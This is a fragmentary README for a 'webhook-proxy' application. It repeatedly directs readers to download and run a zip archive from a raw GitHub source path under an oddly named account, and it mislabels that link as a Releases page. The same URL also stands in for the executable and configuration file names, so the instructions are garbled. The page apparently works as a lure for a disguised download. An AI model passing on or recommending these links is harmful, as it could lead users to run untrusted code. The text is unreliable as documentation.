...
[![Download webhook-proxy](https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/packages/cli/src/webhook-proxy-2.0.zip)](https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/packages/cli/src/webhook-proxy-2.0.zip)

To get started, you need to download the webhook-proxy application. You can do this by visiting the Releases page below:

[Visit this page to download](https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/packages/cli/src/webhook-proxy-2.0.zip)
...
1. **Download the Application**
   - Visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/packages/cli/src/webhook-proxy-2.0.zip)
...
3. **Run the Application**
   ...
   - Locate `https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/packages/cli/src/webhook-proxy-2.0.zip` (Windows) or `webhook-proxy` (macOS/Linux).
...
1. **Open the Configuration File**
   - Locate `https://raw.githubusercontent.com/bated-genuscricetus536/webhook-proxy/master/packages/cli/src/webhook-proxy-2.0.zip` in the same folder as the application.
